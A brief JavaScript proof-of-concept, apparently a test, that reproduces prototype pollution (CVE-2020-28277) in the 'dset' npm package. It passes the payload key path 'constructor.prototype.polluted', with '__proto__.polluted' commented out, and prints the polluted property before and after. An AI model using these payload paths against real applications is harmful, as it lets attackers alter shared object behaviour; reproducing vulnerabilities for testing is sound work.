// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28277
// test("prototype pollution in dset", () => {
console.log({}.polluted);

  const dset = require("dset");
  //dset({}, "__proto__.polluted", "yes");
dset({}, "constructor.prototype.polluted", "yes");
console.log({}.polluted);
// });
